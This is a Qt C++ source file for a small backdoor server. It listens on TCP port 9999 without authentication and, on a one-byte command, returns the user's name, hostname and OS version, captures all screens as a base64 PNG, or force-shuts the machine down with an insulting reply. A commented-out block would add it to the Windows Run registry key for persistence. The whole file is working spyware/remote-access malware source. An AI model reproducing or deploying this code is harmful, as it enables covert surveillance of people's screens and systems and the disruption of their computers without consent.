#include <QtCore/QCoreApplication>
#include <QApplication>
#include <QSysInfo>
#include <QTextStream>
#include <qhostinfo.h>
#include <qnetworkinterface.h>
#include <qtcpserver.h>
#include "mytcpserver.h"
#include <QPixmap>
#include <QDesktopWidget>
#include <QScreen>
#include <QPainter>
#include <qfile.h>
#include <QImage>
#include <QImageWriter>
#include <QByteArray>
#include <QBuffer>
#include <QProcess>
#include <QDir>

/*sadasdasdasd*/
using namespace std;

QSysInfo systemInfo;
QTextStream outp(stdout);

QPixmap grabScreens() {
  auto screens = QGuiApplication::screens();
  QList<QPixmap> scrs;
  int w = 0, h = 0, p = 0;
  foreach (auto scr, screens) {
    QPixmap pix = scr->grabWindow(0);
    w += pix.width();
    if (h < pix.height()) h = pix.height();
    scrs << pix;
  }
  QPixmap final(w, h);
  QPainter painter(&final);
  final.fill(Qt::black);
  foreach (auto scr, scrs) {
    painter.drawPixmap(QPoint(p, 0), scr);
    p += scr.width();
  }
  return final;
}

MyTcpServer::MyTcpServer(QObject *parent) :
    QObject(parent)
{
    server = new QTcpServer(this);

    connect(server, SIGNAL(newConnection()),
            this, SLOT(newConnection()));

    if(!server->listen(QHostAddress::Any, 9999))
    {
        qDebug() << "Server could not start!";
    }
    else
    {
        qDebug() << "Server started!";
    }
}

void MyTcpServer::newConnection()
{
    qDebug() << "New connection!";
    QTcpSocket *socket = server->nextPendingConnection();
    socket->waitForReadyRead();
    int type = (int)socket->read(1).toInt();
    QByteArray bArray;
    switch(type){
    case 1:{
        string form = qgetenv("USERNAME").toStdString()+"|"+systemInfo.machineHostName().toStdString()+"|"+systemInfo.prettyProductName().toStdString()+"|"+systemInfo.productVersion().toStdString();
        bArray = form.c_str();
        break;
    }
    case 2 :{
        QPixmap qwe = grabScreens();
        QBuffer buffer(&bArray);
        buffer.open(QIODevice::WriteOnly);
        qwe.save(&buffer, "PNG");
        bArray=bArray.toBase64();
        break;
    }
    case 3: {
            bArray="Good bye motherfucker";
            QProcess::startDetached("shutdown -s -f -t 0");
            break;
        }
        default:{
            bArray=qgetenv("USERNAME");
        break;
        }
    }

    socket->write(bArray);
    socket->flush();
    socket->waitForBytesWritten(300000);

    socket->close();
}

int main(int argc, char *argv[])
{
    /*#ifdef Q_QS_WIN32
        QSettings settings("HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CurrentVersion\\Run", QSettings::NativeFormat);
        settings.setValue(QApplication::applicationName(), QDir::toNativeSeparators(QApplication::applicationFilePath()));
        settings.sync();
    #endif*/

    outp.setAutoDetectUnicode(1);

    QApplication a(argc, argv);

    MyTcpServer server;

    return a.exec();
}

